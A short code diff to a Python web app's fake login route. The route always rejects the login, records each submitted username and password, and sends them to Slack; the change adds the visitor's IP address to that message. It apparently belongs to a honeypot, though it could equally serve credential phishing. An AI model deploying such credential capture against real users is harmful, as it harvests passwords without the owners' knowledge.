@@ -48,6 +48,6 @@ def login():
     error = 'Invalid Credentials. Please try again.'
     if request.method == 'POST':
         add_entry(request.form['username'], request.form['password'])
-        slack_message("Web login with username: {0} and password: {1}".format(request.form['username'], request.form['password']))
+        slack_message("Web login from {0} with username: {1} and password: {2}".format(request.headers['X-Real-IP'], request.form['username'], request.form['password']))
 
     return render_template('login.html', error=error)
